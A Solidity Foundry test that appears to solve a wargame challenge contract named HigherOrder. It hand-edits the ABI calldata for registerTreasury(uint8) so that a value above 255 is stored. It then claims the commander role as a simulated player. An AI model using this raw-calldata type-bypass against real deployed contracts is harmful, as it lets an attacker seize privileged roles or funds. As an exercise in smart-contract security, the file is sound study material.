// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

import {HigherOrder} from "../src/HigherOrder.sol";

contract HigherOrderTest is Test {
    function testHigherOrder() public {
        HigherOrder order = new HigherOrder();
        address player = makeAddr("player");

        bytes memory registerTreasuryCallData = abi.encodeWithSignature("registerTreasury(uint8)", 0xff);
        registerTreasuryCallData[4] = 0xff;

        console.logBytes(registerTreasuryCallData);

        address(order).call(registerTreasuryCallData);
        console.log("treasury %d", order.treasury());
        assert(order.treasury() > 255);

        vm.startPrank(player, player);
        order.claimLeadership();
        vm.stopPrank();

        console.log("commander %s", order.commander());
        assert(order.commander() == player);
    }
}